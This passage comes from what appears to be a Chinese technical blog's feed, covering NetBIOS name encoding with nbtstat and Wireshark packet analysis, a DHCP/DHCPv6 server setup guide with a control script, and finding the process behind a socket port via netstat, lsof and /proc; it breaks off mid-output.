alt="NetBIOS命名编码示例"></p><p>注意原始名称不足16字节可以补空格<code>0x20</code>或NULL<code>0x00</code>，这里补的是空格；如果长度超过16则需要截取前16字节。</p><p>使用<code>Python</code>可以快速完成编码↓</p><pre><code class="python">&gt;&gt;&gt; orig_name = &#39;LITREILY&#39;.ljust(16)&gt;&gt;&gt; encoded_name = &#39;&#39;.join([ chr((ord(c)&gt;&gt;4) + ord(&#39;A&#39;)) + chr((ord(c)&amp;0x0F) + ord(&#39;A&#39;)) for c in orig_name ])&gt;&gt;&gt; encoded_name&#39;EMEJFEFCEFEJEMFJCACACACACACACACA&#39;</code></pre><p>在真实的数据包中，NetBIOS名称前面是<code>0x20</code>，代表名称固定长度32字节，名称后面填补一个<code>0x00</code>即<code>\0</code>作为结束符。那么上面的<code>LITREILY</code>对应的数据为：</p><pre><code class="yml">20 45 4d 45 4a 46 45 46 43 45 46 45 4a 45 4d 464a 43 41 43 41 43 41 43 41 43 41 43 41 43 41 4341 00</code></pre><blockquote><p><strong>注意：</strong></p><p>A label length count is actually a 6-bit field in the label length field. The most significant 2 bits of the field, bits 7 and 6, are flags allowing an escape from the above compressed representation. <strong>If bits 7 and 6 are both set (11), the following 14 bits are an offset pointer into the full message to the actual label string from another domain name that belongs in this name.</strong> This label pointer allows for a further compression of a domain name in a packet.</p><p>简单说，当长度设置不为<code>0x20</code>，而是将最高两位置1，即设为<code>0xc0</code>时，代表当前名称使用指针，随后的字节指定名称所在的位置。</p></blockquote><h2 id="nbtstat"><a href="#nbtstat" class="headerlink" title="nbtstat"></a>nbtstat</h2><p><code>nbtstat.exe</code>是Windows中用于查看NBT status的工具，通过它可以查看当前局域网内的NetBIOS name.</p><h3 id="帮助信息"><a href="#帮助信息" class="headerlink" title="帮助信息"></a>帮助信息</h3><pre><code class="yml">C:\Users\Litre&gt;nbtstat.exe -a显示协议统计和当前使用 NBI 的 TCP/IP 连接(在 TCP/IP 上的 NetBIOS)。NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n]        [-r] [-R] [-RR] [-s] [-S] [interval] ]  -a   (适配器状态)    列出指定名称的远程机器的名称表  -A   (适配器状态)    列出指定 IP 地址的远程机器的名称表。  -c   (缓存)          列出远程[计算机]名称及其 IP 地址的 NBT 缓存  -n   (名称)          列出本地 NetBIOS 名称。  -r   (已解析)        列出通过广播和经由 WINS 解析的名称  -R   (重新加载)      清除和重新加载远程缓存名称表  -S   (会话)          列出具有目标 IP 地址的会话表  -s   (会话)          列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。  -RR  (释放刷新)      将名称释放包发送到 WINS，然后启动刷新  RemoteName   远程主机计算机名。  IP address   用点分隔的十进制表示的 IP 地址。  interval     重新显示选定的统计、每次显示之间暂停的间隔秒数。               按 Ctrl+C 停止重新显示统计。</code></pre><p>其中<code>RemoteName</code>既可以是ASCII形式的名称，也可以是IP地址。</p><h3 id="使用示例一"><a href="#使用示例一" class="headerlink" title="使用示例一"></a>使用示例一</h3><p>第一个例子，在加入域<code>DELTA</code>的办公电脑上。3个网卡，第1个网卡连接路由器，第2个网卡连接公司网，第3个为虚拟网卡。</p><pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat.exe -nRouter:节点 IP 址址: [192.168.1.10] 范围 ID: []                NetBIOS 本地名称表       名称               类型         状态    ---------------------------------------------    CNSHDNI2PC074  &lt;00&gt;  唯一          已注册    DELTA          &lt;00&gt;  组           已注册    CNSHDNI2PC074  &lt;20&gt;  唯一          已注册    DELTA          &lt;1E&gt;  组           已注册    DELTA          &lt;1D&gt;  唯一          已注册    ..__MSBROWSE__.&lt;01&gt;  组           已注册Company:节点 IP 址址: [172.17.144.33] 范围 ID: []                NetBIOS 本地名称表       名称               类型         状态    ---------------------------------------------    CNSHDNI2PC074  &lt;00&gt;  唯一          已注册    DELTA          &lt;00&gt;  组           已注册    CNSHDNI2PC074  &lt;20&gt;  唯一          已注册    DELTA          &lt;1E&gt;  组           已注册以太网:节点 IP 址址: [0.0.0.0] 范围 ID: []    缓存中没有名称</code></pre><p>需要注意的是，名称表中每个名称都是16字节，中间空白处是空格符，最后一个字节用<code>&lt;&gt;</code>显示，里面使用16进制数表示。如<code>CHSH2DNIPC074__&lt;00&gt;</code>，<code>_</code>代表空格，最后一个字节<code>&lt;00&gt;</code>是<code>\0</code>. NetBIOS name可以唯一，也可以是多个设备共用一个组，唯一名称用于指定唯一一台设备，而组名如此处的<code>DELTA</code>是域名称，局域网加入域对应的域名就是这种组名称，也称之为<strong>工作组</strong>。</p><h3 id="使用示例二"><a href="#使用示例二" class="headerlink" title="使用示例二"></a>使用示例二</h3><p>第二个例子，我使用家用台式PC在局域网内进行了反复测试。下面是简要的抓包信息。</p><p><img src="/assets/network/nbns/nbns.png" alt="nbns packets"></p><p><code>nbtstat -a RemoteName</code>用于请求指定名称所在设备的名称表。</p><pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -a DZ-DN-700eth0:节点 IP 址址: [192.168.1.14] 范围 ID: []           NetBIOS 远程计算机名称表       名称               类型         状态    ---------------------------------------------    DZ-DN-700      &lt;20&gt;  唯一          已注册    DZ-DN-700      &lt;00&gt;  唯一          已注册    DIAS           &lt;00&gt;  组           已注册    DIAS           &lt;1E&gt;  组           已注册    MAC 地址 = E4-42-A6-18-AB-00C:\WINDOWS\system32&gt;nbtstat -a 192.168.1.12eth0:节点 IP 址址: [192.168.1.14] 范围 ID: []           NetBIOS 远程计算机名称表       名称               类型         状态    ---------------------------------------------    DZ-DN-700      &lt;20&gt;  唯一          已注册    DZ-DN-700      &lt;00&gt;  唯一          已注册    DIAS           &lt;00&gt;  组           已注册    DIAS           &lt;1E&gt;  组           已注册    MAC 地址 = E4-42-A6-18-AB-00</code></pre><p><code>nbtstat -A IP_Address</code>用于请求指定IP所在设备的名称表。</p><pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -A 192.168.1.12eth0:节点 IP 址址: [192.168.1.14] 范围 ID: []           NetBIOS 远程计算机名称表       名称               类型         状态    ---------------------------------------------    DZ-DN-700      &lt;20&gt;  唯一          已注册    DZ-DN-700      &lt;00&gt;  唯一          已注册    DIAS           &lt;00&gt;  组           已注册    DIAS           &lt;1E&gt;  组           已注册    DIAS           &lt;1D&gt;  唯一          已注册    ..__MSBROWSE__.&lt;01&gt;  组           已注册    MAC 地址 = E4-42-A6-18-AB-00</code></pre><p><code>nbtstat -c</code>用于查看当前设备缓存中的名称表，注意每个名称都是可以被修改的，所以需要定时刷新，同时每个名称都有其寿命，寿命耗尽后需要重新请求。</p><pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -ceth0:节点 IP 址址: [192.168.1.14] 范围 ID: []                  NetBIOS 远程缓存名称表        名称              类型       主机地址    寿命[秒]    ------------------------------------------------------------    DZ-DN-700      &lt;20&gt;  唯一              192.168.1.12        269    DZ-DN-700      &lt;00&gt;  唯一              192.168.1.12        269</code></pre><p><code>nbtstat -n</code>用于查看当前设备的本地名称表，与第一个例子一样。</p><pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -neth0:节点 IP 址址: [192.168.1.14] 范围 ID: []                NetBIOS 本地名称表       名称               类型         状态    ---------------------------------------------    DT-LITREILY    &lt;20&gt;  唯一          已注册    DT-LITREILY    &lt;00&gt;  唯一          已注册    WORKGROUP      &lt;00&gt;  组           已注册</code></pre><p><code>nbtstat -r</code>用于查看通过广播和经由 WINS 解析的名称</p><pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -r    NetBIOS 名称解析和注册统计    ----------------------------------------------------    通过广播解析的     = 5    通过名称服务器解析   = 0    通过广播注册的   = 3    通过名称服务器注册的 = 0    通过广播解析的 NetBIOS 名称    ---------------------------------------------           DZ-DN-700      &lt;00&gt;           DZ-DN-700      &lt;00&gt;           DZ-DN-700      &lt;00&gt;           DIAS           &lt;00&gt;           DZ-DN-700      &lt;00&gt;</code></pre><p><code>nbtstat -s</code>与<code>nbtstat -S</code>都用于会话服务信息查询，因为没有连接所以信息为空。</p><pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -seth0:节点 IP 址址: [192.168.1.14] 范围 ID: []    无连接C:\WINDOWS\system32&gt;nbtstat -Seth0:节点 IP 址址: [192.168.1.14] 范围 ID: []    无连接</code></pre><p><code>nbtstat -R</code>用于清除缓存，清除后再用<code>-c</code>查看就会显示没有名称了。</p><pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -R    NBT 远程缓存名称表的成功清除和预加载。C:\WINDOWS\system32&gt;nbtstat -ceth0:节点 IP 址址: [192.168.1.14] 范围 ID: []    缓存中没有名称</code></pre><p><code>nbtstat -RR</code>用于刷新经本机注册的NetBIOS名称，间隔一段时间方能刷新第二次。</p><pre><code class="yml">C:\WINDOWS\system32&gt;nbtstat -RR    已经刷新经过此计算机注册的 NetBIOS 名称。</code></pre><h2 id="Windows-配置NetBIOS"><a href="#Windows-配置NetBIOS" class="headerlink" title="Windows 配置NetBIOS"></a>Windows 配置NetBIOS</h2><p>在Windows操作系统中，可以打开某网卡的属性配置，然后选择IPv4配置的高级选项，<code>WINS</code>选项卡即可配置<code>NetBIOS</code>。默认情况是启用的，与下图所示一致。</p><p><img src="/assets/network/nbns/netbios_config.png" alt="Windows上的NetBIOS配置"></p><h2 id="wireshark-实例分析"><a href="#wireshark-实例分析" class="headerlink" title="wireshark 实例分析"></a>wireshark 实例分析</h2><p>最后来分析两个使用wireshark抓的NBNS数据包，以便更直观的理解和记忆。</p><h3 id="Node-Status"><a href="#Node-Status" class="headerlink" title="Node Status"></a>Node Status</h3><p>使用指令<code>nbtstat -A 192.168.1.12</code>向指定设备发送Node status query，使用wireshark抓包。</p><p><img src="/assets/network/nbns/nodestatus_ws.png" alt="nbns node status"></p><p>请求数据包如下：</p><p><img src="/assets/network/nbns/nodestatus_ws_query.png" alt="nbns node status query"></p><p>从wireshark得到的解析数据如下：</p><pre><code class="yml">0000   e4 42 a6 18 ab 00 00 e0 4c 5a 0a 78 08 00 45 00   äB¦.«..àLZ.x..E.0010   00 4e 1e 82 00 00 80 11 98 b2 c0 a8 01 0e c0 a8   .N.......²À¨..À¨0020   01 0c 00 89 00 89 00 3a 5a 12 e2 b1 00 00 00 01   .......:Z.â±....0030   00 00 00 00 00 00 20 43 4b 41 41 41 41 41 41 41   ...... CKAAAAAAA0040   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA0050   41 41 41 41 41 41 41 00 00 21 00 01               AAAAAAA..!..NetBIOS Name Service    Transaction ID: 0xe2b1    Flags: 0x0000, Opcode: Name query        0... .... .... .... = Response: Message is a query        .000 0... .... .... = Opcode: Name query (0)        .... ..0. .... .... = Truncated: Message is not truncated        .... ...0 .... .... = Recursion desired: Do not do query recursively        .... .... ...0 .... = Broadcast: Not a broadcast packet    Questions: 1    Answer RRs: 0    Authority RRs: 0    Additional RRs: 0    Queries        *&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;: type NBSTAT, class IN            Name: *&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt;&lt;00&gt; (Workstation/Redirector)            Type: NBSTAT (33)            Class: IN (1)</code></pre><p>该数据报包含一个请求，所以<code>Questions</code>为1，其余为0；请求包中的编码名称为<code>*</code>的编码后数据CKAAAAAAAAAAAAAAA...; 由于使用的是指定IP，所以是单播包；因为是NODE STATUS REQUEST, 所以QUESTION_TYPE是NBSTAT(0x0021).</p><p>从指定设备获取到的响应数据如下：</p><p><img src="/assets/network/nbns/nodestatus_ws_response.png" alt="nbns node status response"></p><p>从截图中已经可以清晰的看到数据格式及具体内容了，被折叠的名称信息中，<code>DZ-DN-700&lt;20&gt;</code>与<code>DIAS&lt;1e&gt;</code>如下：</p><pre><code class="yml">0000   00 e0 4c 5a 0a 78 e4 42 a6 18 ab 00 08 00 45 00   ..LZ.x........E.0010   00 cb 53 50 00 00 80 11 63 67 c0 a8 01 0c c0 a8   ..SP....cg......0020   01 0e 00 89 00 89 00 b7 01 c0                     .........0020                                 e2 b1 84 00 00 00            .......0030   00 01 00 00 00 00 20 43 4b 41 41 41 41 41 41 41   ...... CKAAAAAAA0040   41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA0050   41 41 41 41 41 41 41 00 00 21 00 01 00 00 00 00   AAAAAAA..!......0060   00 77 04                                          .w.0060            44 5a 2d 44 4e 2d 37 30 30 20 20 20 20      DZ-DN-700    0070   20 20 20 04 00                                       ..Name: DZ-DN-700&lt;20&gt; (Server service)Name flags: 0x0400, ONT: B-node, Name is active    0... .... .... .... = Name type: Unique name    .00. .... .... .... = ONT: B-node (0)    ...0 .... .... .... = Name is being deregistered: No    .... 0... .... .... = Name is in conflict: No    .... .1.. .... .... = Name is active: Yes    .... ..0. .... .... = Permanent node name: No0070                  44 5a 2d 44 4e 2d 37 30 30 20 20        DZ-DN-700  0080   20 20 20 20 00 04 00                                  ...Name: DZ-DN-700&lt;00&gt; (Workstation/Redirector)Name flags: 0x0400, ONT: B-node, Name is active    0... .... .... .... = Name type: Unique name    .00. .... .... .... = ONT: B-node (0)    ...0 .... .... .... = Name is being deregistered: No    .... 0... .... .... = Name is in conflict: No    .... .1.. .... .... = Name is active: Yes    .... ..0. .... .... = Permanent node name: No0080                        44 49 41 53 20 20 20 20 20          DIAS     0090   20 20 20 20 20 20 00 84 00                              ...Name: DIAS&lt;00&gt; (Workstation/Redirector)Name flags: 0x8400, Name type, ONT: B-node, Name is active    1... .... .... .... = Name type: Group name    .00. .... .... .... = ONT: B-node (0)    ...0 .... .... .... = Name is being deregistered: No    .... 0... .... .... = Name is in conflict: No    .... .1.. .... .... = Name is active: Yes    .... ..0. .... .... = Permanent node name: No0090                              44 49 41 53 20 20 20            DIAS   00a0   20 20 20 20 20 20 20 20 1e 84 00                          ...Name: DIAS&lt;1e&gt; (Browser Election Service)Name flags: 0x8400, Name type, ONT: B-node, Name is active    1... .... .... .... = Name type: Group name    .00. .... .... .... = ONT: B-node (0)    ...0 .... .... .... = Name is being deregistered: No    .... 0... .... .... = Name is in conflict: No    .... .1.. .... .... = Name is active: Yes    .... ..0. .... .... = Permanent node name: No00a0                                    e4 42 a6 18 ab              .B...00b0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................00c0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................00d0   00 00 00 00 00 00 00 00 00                        .........</code></pre><h3 id="Name-Registration"><a href="#Name-Registration" class="headerlink" title="Name Registration"></a>Name Registration</h3><p><img src="/assets/network/nbns/registration_ws.png" alt="nbns registration"></p><p>NBNS名称注册请求包如下图所示：</p><p><img src="/assets/network/nbns/registration_ws_pkt.png" alt="nbns registration query"></p><p>请求包格式与<a href="#NAME-REGISTRATION-REQUEST">NAME REGISTRATION REQUEST</a>中的一致。使用广播包方式，<code>OPCODE</code>为5，包含一条Questions记录和Additional记录，注册地址为发送方的IP地址192.168.1.12.</p><p>在局域网内的其它设备或路由器接收到该广播包后，即可将其名称和IP地址记录到本地缓存当中。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://tools.ietf.org/html/rfc1001">rfc1001 - protocol standard for a nETbios service on a tcp/udp transport: concepts and methods</a></li><li><a href="https://tools.ietf.org/html/rfc1002">rfc1002 - protocol standard for a nETbios service on a tcp/udp transport: detailed specifications</a></li><li><a href="https://github.com/Litreily/Net_packets/tree/master/NetBIOS">wireshark抓包数据</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
          <category> Protocol </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Setup dhcpd/dhcpdv6 server</title>
      <link href="2020/01/17/dhcpd_server/"/>
      <url>2020/01/17/dhcpd_server/</url>
      
        <content type="html"><![CDATA[<p>搭建DHCP server在许多网络应用中是非常必要的，尤其是测试IPv6相关的功能时，本文就来介绍下针对IPv4和IPv6该如何搭建DHCP server.</p><h2 id="Install-dhcpd-server"><a href="#Install-dhcpd-server" class="headerlink" title="Install dhcpd server"></a>Install dhcpd server</h2><p>首先通过<code>apt</code>安装<code>isc-dhcp-server</code></p><pre><code class="bash">sudo apt install isc-dhcp-server</code></pre><h2 id="Setup-dhcpd"><a href="#Setup-dhcpd" class="headerlink" title="Setup dhcpd"></a>Setup dhcpd</h2><h3 id="Config-interfaces"><a href="#Config-interfaces" class="headerlink" title="Config interfaces"></a>Config interfaces</h3><p>通过<code>ifconfig</code>获取以太网口的接口名称, 下面省略了loopback接口<code>lo</code>，后面也是一样默认省略。</p><pre><code class="bash">$ ifconfigenp4s0f0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500        ether 20:6a:8a:6c:0f:da  txqueuelen 1000 (Ethernet)        RX packets 154583  bytes 186953698 (186.9 MB)        RX errors 0  dropped 2  overruns 0  frame 0        TX packets 77038  bytes 6244250 (6.2 MB)        Tx erros 0  dropped 0 overruns 0  carrier 0  collisions 0        device interrupt 19</code></pre><p>编辑配置文件<code>/etc/default/isc-dhcp-server</code>，修改最后两行，设置为刚刚获取到的interface</p><pre><code class="bash">$ tail -n 2 /etc/default/isc-dhcp-serverINTERFACESv4=&quot;enp4s0f0&quot;INTERFACESv6=&quot;enp4s0f0&quot;</code></pre><h3 id="Config-dhcpd-server"><a href="#Config-dhcpd-server" class="headerlink" title="Config dhcpd server"></a>Config dhcpd server</h3><p>首先针对IPv4配置dhcpd server，配置文件为<code>/etc/dhcp/dhcpd.conf</code>, 配置内容包括网段，子网掩码，默认路由，默认DNS</p><pre><code class="bash">$ tail -n 5 /etc/dhcp/dhcpd.confsubnet 10.0.0.0 netmask 255.255.255.0 &#123;    range 10.0.0.10 10.0.0.99;    option routers 10.0.0.138;    option domain-name-servers 10.0.0.138;&#125;</code></pre><h3 id="Add-static-ipv4"><a href="#Add-static-ipv4" class="headerlink" title="Add static ipv4"></a>Add static ipv4</h3><p>此时只要再给网口设置一个静态IP就可以了</p><pre><code class="bash">sudo ifconfig enp4s0f0 10.0.0.138 netmask 255.255.255.0</code></pre><h3 id="Start-isc-dhcp-server"><a href="#Start-isc-dhcp-server" class="headerlink" title="Start isc-dhcp-server"></a>Start isc-dhcp-server</h3><pre><code class="bash">sudo service isc-dhcp-server startsudo service isc-dhcp-server status</code></pre><p>通过第二条指令可以查看当前dhcpd的状态，显示<code>running</code>表示已经正常工作</p><pre><code class="bash">$ sudo service isc-dhcp-server status● isc-dhcp-server.service - ISC DHCP IPv4 server   Loaded: loaded (/lib/systemd/system/isc-dhcp-server.service; enabled; vendor preset: enabled)   Active: active (running) since Sat 2020-01-18 04:22:28 CST; 7s ago     Docs: man:dhcpd(8) Main PID: 13291 (dhcpd)    Tasks: 1 (limit: 4915)   CGroup: /system.slice/isc-dhcp-server.service           └─13291 dhcpd -user dhcpd -group dhcpd -f -4 -pf /run/dhcp-server/dhcpd.pid -cf /etc/dhcp/dhcpd.conf1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: PID file: /run/dhcp-server/dhcpd.pid1月 18 04:22:28 litreily-Aspire-4750 sh[13291]: Wrote 1 leases to leases file.1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Wrote 1 leases to leases file.1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Listening on LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/241月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Sending on   LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/241月 18 04:22:28 litreily-Aspire-4750 sh[13291]: Listening on LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/241月 18 04:22:28 litreily-Aspire-4750 sh[13291]: Sending on   LPF/enp4s0f0/20:6a:8a:6c:0f:da/10.0.0.0/241月 18 04:22:28 litreily-Aspire-4750 sh[13291]: Sending on   Socket/fallback/fallback-net1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Sending on   Socket/fallback/fallback-net1月 18 04:22:28 litreily-Aspire-4750 dhcpd[13291]: Server starting service.</code></pre><h2 id="Setup-dhcpdv6"><a href="#Setup-dhcpdv6" class="headerlink" title="Setup dhcpdv6"></a>Setup dhcpdv6</h2><p>配置IPv6的dhcpd与IPv4类似，上面已经配置过<code>/etc/default/interfaces</code>，此处省略</p><h3 id="config-dhcpdv6-server"><a href="#config-dhcpdv6-server" class="headerlink" title="config dhcpdv6 server"></a>config dhcpdv6 server</h3><p>配置文件<code>/etc/dhcp/dhcpd6.conf</code></p><pre><code class="bash">$ tail -n 5 /etc/dhcp/dhcpd6.confsubnet6 2001:470:19:1316::/64 &#123;    range6 2001:470:19:1316::100 2001:470:19:1316::0fff;    option dhcp6.name-servers fe80::226a:8aff:fe6c:0fda;    prefix6 2001:470:19:1316:2:: 2001:470:19:1316:0fff:: /80;&#125;</code></pre><p>上面配置了IPv6的网段，分配范围，默认dns，以及IPv6前缀</p><h3 id="Add-static-IPv6"><a href="#Add-static-IPv6" class="headerlink" title="Add static IPv6"></a>Add static IPv6</h3><p>对于IPv6，需要添加两个ip，一个以<code>fe80::</code>开头的本地ip，另外一个静态global ip</p><pre><code class="bash">sudo ifconfig enp4s0f0 inet6 add 2001:470:19:1316::1/64sudo ifconfig enp4s0f0 inet6 add fe80::226a:8aff:fe6c:fda/64</code></pre><h3 id="Start-isc-dhcp-server6"><a href="#Start-isc-dhcp-server6" class="headerlink" title="Start isc-dhcp-server6"></a>Start isc-dhcp-server6</h3><p>dhcpdv6对应的server名称多了个6，启动方式自然也是一样的</p><pre><code class="bash">sudo service isc-dhcp-server6 startsudo service isc-dhcp-server6 status</code></pre><h2 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h2><p>在手动配置时，注意在启动服务之前，一定要记得配置好静态IP，否则无法启动server，并在查看状态时显示以下信息</p><pre><code class="bash">$ sudo service isc-dhcp-server status● isc-dhcp-server.service - ISC DHCP IPv4 server   Loaded: loaded (/lib/systemd/system/isc-dhcp-server.service; enabled; vendor preset: enabled)   Active: failed (Result: exit-code) since Sat 2020-01-18 04:23:23 CST; 10s ago     Docs: man:dhcpd(8)  Process: 13864 ExecStart=/bin/sh -ec      CONFIG_FILE=/etc/dhcp/dhcpd.conf;      if [ -f /etc/ltsp/dhcpd.conf ]; then CONFIG_FILE=/etc/ltsp/dhcpd.conf; fi;      [ -e /var/lib/dhcp/dhcpd.leases ] || touch /var/lib/dhcp/dhcpd.leases;      chown root:dhcpd /var/lib/dhcp /var/lib/dhcp/dhcpd.leases;      chmod 775 /var/lib/dhcp ; chmod 664 /var/lib/dhcp/dhcpd.leases;      exec dhcpd -user dhcpd -group dhcpd -f -4 -pf /run/dhcp-server/dhcpd.pid -cf $CONFIG_FILE $INTERFACES (code=exited, status=1/FAILURE) Main PID: 13864 (code=exited, status=1/FAILURE)1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]:1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: If you think you have received this message due to a bug rather1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: than a configuration issue please read the section on submitting1月 18 04:23:23 litreily-Aspire-4750 systemd[1]: isc-dhcp-server.service: Main process exited, code=exited, status=1/FAILURE1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: bugs on either our web page at www.isc.org or in the README file1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: before submitting a bug.  These pages explain the proper1月 18 04:23:23 litreily-Aspire-4750 systemd[1]: isc-dhcp-server.service: Failed with result &#39;exit-code&#39;.1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: process and the information we find helpful for debugging..1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]:1月 18 04:23:23 litreily-Aspire-4750 dhcpd[13864]: exiting.</code></pre><h2 id="Shell-script"><a href="#Shell-script" class="headerlink" title="Shell script"></a>Shell script</h2><p>为了方便配置server，我写了一个简单的执行脚本，network servers control, 简称<code>nsc</code></p><pre><code class="zsh">$ cat nsc#!/bin/zsh# network servers controlIFCONFIG=1INTERFACE=enp4s0f0IPv4=10.0.0.138IPv6=2001:470:19:1316::1/64IPv6_local=fe80::226a:8aff:fe6c:fda/64stop_dhcp() &#123;    # stop services    sudo service isc-dhcp-server stop    sudo service isc-dhcp-server6 stop    # del all default ip    if [ $IFCONFIG -eq 1 ]; then        sudo ifconfig $INTERFACE 0.0.0.0        sudo ifconfig $INTERFACE del $IPv6        sudo ifconfig $INTERFACE del $IPv6_local    else        sudo ip addr delete $IPv4/24 dev enp4s0f0        sudo ip addr delete $IPv6 dev enp4s0f0        sudo ip addr delete $IPv6_local dev enp4s0f0    fi&#125;start_dhcp() &#123;    # setup default ip    if [ $IFCONFIG -eq 1 ]; then        sudo ifconfig $INTERFACE $IPv4 netmask 255.255.255.0        sudo ifconfig $INTERFACE inet6 add $IPv6        sudo ifconfig $INTERFACE inet6 add $IPv6_local    else        sudo ip addr add $IPv4/24 dev enp4s0f0        sudo ip addr add $IPv6 dev enp4s0f0        sudo ip addr add $IPv6_local dev enp4s0f0    fi    # start services    sudo service isc-dhcp-server start    [ $? -eq 0 ] &amp;&amp; echo &quot;start dhcpd success!&quot;    sudo service isc-dhcp-server6 start    [ $? -eq 0 ] &amp;&amp; echo &quot;start dhcpdv6 success!&quot;&#125;case &quot;$1&quot; in    &quot;stop&quot;)        stop_dhcp        ;;    &quot;start&quot;)        start_dhcp        ;;esac</code></pre><p>脚本中通过<code>$IFCONFIG</code>变量来选择使用<code>ifconfig</code>指令还是<code>ip</code>指令进行配置。使用时只需执行<code>nsc start</code>打开server, 执行<code>nsc stop</code>关闭server.</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> dhcp </tag>
            
            <tag> ipv6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>根据socket端口号查看进程信息</title>
      <link href="2020/01/15/socket_fd/"/>
      <url>2020/01/15/socket_fd/</url>
      
        <content type="html"><![CDATA[<p>根据已知的一个端口号，以telnet默认端口号23为例，去查找系统中监听该端口号的进程，主要可以通过下面3种方式。</p><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>使用<code>netstat</code>可以查看系统网络状态，<code>-p</code>参数可以显示对应的进程信息<code>pid/process</code></p><pre><code class="bash">$ netstat -anp |grep &quot;:23&quot;tcp        0      0 192.168.1.1:23          0.0.0.0:*               LISTEN      3698/utelnetdtcp        0      0 192.168.1.1:23          192.168.1.10:10381      ESTABLISHED 3698/utelnetd</code></pre><p>从上面的信息中可以看到两条信息：</p><ol><li>监听23端口的进程是pid为<code>3698</code>的<code>utelnetd</code></li><li>目前存在一个已连接的client，client IP为<code>192.168.1.10</code>，tcp连接端口为<code>10381</code></li></ol><h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><p>在<code>Linux</code>系统中，一切皆为文件，socket也不例外，而<code>lsof</code>指令用于<code>list open files</code>，能够显示系统所有已经打开的文件描述符，根据上面已知的进程pid或进程名称，可以grep到相关信息。</p><pre><code class="bash">$ lsof |grep utelnetd3698    /usr/sbin/utelnetd      /dev/console3698    /usr/sbin/utelnetd      /dev/console3698    /usr/sbin/utelnetd      /dev/null3698    /usr/sbin/utelnetd      socket:[12882]3698    /usr/sbin/utelnetd      socket:[349364]</code></pre><p>可以看出，<code>utelnetd</code>打开了5个文件，对应5个fd(file descriptor)。前面3个分别对应标准输入stdin，标准输出stdout和标准错误输出stderr；接着的两个socket对应的就是<code>netstat</code>显示的1个socket server和1个socket client。</p><p><strong>注：</strong>socket:[12882]信息中12882对应的是<code>inode</code>信息，后面<code>proc</code>信息中可以印证。</p><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><p>除了上面两个指令外，<code>proc</code>文件系统中的信息也是非常常用的，根据已经的进程pid <code>3698</code>，我们可以查看进程已打开的所有文件以及socket信息。</p><h3 id="查看文件描述符"><a href="#查看文件描述符" class="headerlink" title="查看文件描述符"></a>查看文件描述符</h3><pre><code class="bash">$ ls -l /proc/3698/fd/lr-x------    1 root     root            64 Dec 20 07:57 0 -&gt; /dev/consolel-wx------    1 root     root            64 Dec 20 07:57 1 -&gt; /dev/consolel-wx------    1 root     root            64 Dec 20 07:57 2 -&gt; /dev/nulllrwx------    1 root     root            64 Dec 20 07:57 3 -&gt; socket:[12882]lrwx------    1 root     root            64 Dec 20 07:57 4 -&gt; socket:[349364]</code></pre><p>前3个0,1,2对应的就是stdin,stdout和stderr；3,4对应的就是两条socket连接。</p><h3 id="查看socket信息"><a href="#查看socket信息" class="headerlink" title="查看socket信息"></a>查看socket信息</h3><pre><code class="bash">$ cat /proc/3698/net/tcp  sl  local_address rem_address   st tx_queue rx_queue tr tm-&gt;when retrnsmt   uid  timeout inode     0: 00000000:0D05 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 13663 1 de008000 100 0 0 10 0   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28897 1 de008500 100 0 0 10 0   2: 00000000:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 28962 1 de008f00 100 0 0 10 0   3: 